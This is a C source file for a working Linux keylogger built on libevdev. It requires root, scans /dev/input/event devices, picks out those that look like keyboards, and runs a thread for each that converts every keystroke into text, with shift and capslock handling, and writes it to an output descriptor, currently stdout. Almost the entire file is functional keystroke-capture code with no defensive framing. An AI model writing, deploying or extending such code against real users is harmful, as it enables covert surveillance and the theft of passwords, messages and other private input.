#define _POSIX_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

/* Linux Kernel Documentation/input/input.txt (3.2.4 evdev) */
#define NO_OF_EVENT_INTERFACES 32

static struct libevdev *devs[NO_OF_EVENT_INTERFACES];
static int outfd;
static bool capslock;
static bool shift;

/*
 * Heuristic to check if given evdev device is a keyboard or not.
 * Linux Kernel Documentation/input/event-codes.txt
 *
 * @param dev An initialized evdev device
 * @return true if this device seems to be a keyboard, or false otherwise.
 */
static bool is_keyboard(const struct libevdev *dev)
{
	return libevdev_has_event_type(dev, EV_KEY)
		&& !libevdev_has_event_type(dev, EV_REL)
		&& !libevdev_has_event_type(dev, EV_ABS)
		&& !libevdev_has_event_type(dev, EV_SW)
		&& !libevdev_has_event_type(dev, EV_FF)
		&& !libevdev_has_event_type(dev, EV_PWR)
		&& !libevdev_has_event_type(dev, EV_FF_STATUS);
}

/*
 * Initialize libevdev structs for devices that seem to be keyboards.
 *
 * @return Number of keyboard-like devices detected.
 */
static int init_keydevs(void)
{
	int keydevs = 0;
	const char * const path_prefix = "/dev/input/event";
	const size_t path_len = strlen(path_prefix) + 10;

	for (int i = 0; i < NO_OF_EVENT_INTERFACES; i++) {
		int fd, rc;
		char path[path_len];
		struct libevdev *device = NULL;

		devs[i] = NULL;
		snprintf(path, path_len, "%s%d", path_prefix, i);

		fd = open(path, O_RDONLY);
		if (fd == -1) continue;

		rc = libevdev_new_from_fd(fd, &device);
		if (rc < 0) continue;

		if (is_keyboard(device)) {
			devs[i] = device;
			keydevs++;
		} else {
			libevdev_free(device);
			close(fd);
		}
	}

	return keydevs;
}

/* Write the event to the output file descriptor */
static void write_event(const struct input_event *event)
{
	/* Respond only to key events */
	if (!libevdev_event_is_type(event, EV_KEY))
		return;

	/* TODO: Use mutex to correctly use global variables */
	if (libevdev_event_is_code(event, EV_KEY, KEY_LEFTSHIFT)
	    || libevdev_event_is_code(event, EV_KEY, KEY_RIGHTSHIFT)) {
		shift = event->value == 0 ? false : true;
	} else if (event->value == 0) {
		/* Key release */
		return;
	} else if (libevdev_event_is_code(event, EV_KEY, KEY_CAPSLOCK)) {
		/* Toggle capslock */
		if (event->value == 1)
			capslock = !capslock;
	}

	const char *p = libevdev_event_code_get_name(event->type, event->code) + 4;
	size_t plen = strlen(p);
	size_t wlen = plen + 10;
	char towrite[wlen];

	if (plen == 1) {
		if (capslock ^ shift)
			snprintf(towrite, wlen, "%c", *p);
		else
			snprintf(towrite, wlen, "%c", tolower(*p));
		/*
		 * write(2) wasn't atomic with respect updating
		 * the file offset until Linux 3.14
		 */
	} else {
		snprintf(towrite, wlen, "<%s>", p);
	}

	write(outfd, towrite, strlen(towrite));

	if (libevdev_event_is_code(event, EV_KEY, KEY_ENTER)
	    || libevdev_event_is_code(event, EV_KEY, KEY_KPENTER))
		write(outfd, "\n", 1);

	fsync(outfd);
}

/* Listen for events */
static void *event_handler(void *arg)
{
	int rc;
	struct input_event event;
	struct libevdev *device = (struct libevdev *)arg;

	do {
		rc = libevdev_next_event(device,
			LIBEVDEV_READ_FLAG_NORMAL | LIBEVDEV_READ_FLAG_BLOCKING,
			&event);

		if (rc == LIBEVDEV_READ_STATUS_SUCCESS)
			write_event(&event);

	} while (rc == LIBEVDEV_READ_STATUS_SYNC
		|| rc == LIBEVDEV_READ_STATUS_SUCCESS
		|| rc == -EAGAIN);

	/* Exit the thread if we encounter any error */
	return NULL;
}

int main(int argc, char **argv)
{
	int signo;
	int rc = 0;
	int no_of_keydevs = 0;
	sigset_t sigset;
	pthread_attr_t pthread_attr;

	if (geteuid() != 0) {
		fprintf(stderr, "WE NO HAVE NO SUPERUSER PREVILIGES!!!\n");
		exit(EXIT_FAILURE);
	}

	no_of_keydevs = init_keydevs();
	if (no_of_keydevs == 0) {
		fprintf(stderr, "No keyboard-like devices detected.\nQUITTING.\n");
		exit(EXIT_FAILURE);
	}
	printf("Detected %d keyboard-like devices.\n", no_of_keydevs);


	/* Initialize the pthread attribute object */
	rc = pthread_attr_init(&pthread_attr);
	if (rc != 0) {
		errno = rc;
		perror("pthread_attr_init");
		goto out;
	}

	/* Since no return value is required, create detached threads. */
	rc = pthread_attr_setdetachstate(&pthread_attr, PTHREAD_CREATE_DETACHED);
	if (rc != 0) {
		errno = rc;
		perror("pthread_attr_setdetachstate");
		goto out;
	}


	/* TODO: Open the output file */
	outfd = fileno(stdout);

	/* Assume capslock is OFF initially. */
	capslock = false;
	shift = false;

	/*
	 * Block all signals in the main thread before any other threads are
	 * created. Each subsequently created thread will inherit a copy of the
	 * main thread's signal mask.
	 */
	rc = sigfillset(&sigset);
	if (rc == -1) {
		perror("sigfillset");
		goto out;
	}

	rc = sigprocmask(SIG_SETMASK, &sigset, NULL);
	if (rc == -1) {
		perror("sigprocmask");
		goto out;
	}


	for (int i = 0; i < NO_OF_EVENT_INTERFACES; i++) {
		pthread_t tid;

		if (devs[i] == NULL)
			continue;

		rc = pthread_create(&tid, &pthread_attr, event_handler, devs[i]);
		if (rc != 0) {
			errno = rc;
			perror("pthread_create");
		}
	}

	/* Destroy pthread attribute object */
	rc = pthread_attr_destroy(&pthread_attr);

	/*
	 * Make the main thread wait for any signal we receive.
	 *
	 * This has the advantage that asynchronously generated signals are
	 * received synchronously.
	 *
	 * TODO: There is no way to stop the process? How to respond to SIGTSTP
	 */
	while (sigwait(&sigset, &signo) == 0) {
		if (signo == SIGTERM || signo == SIGINT)
			goto out;
	}

out:
	/* TODO: Cleanup everything */
	return 0;
}
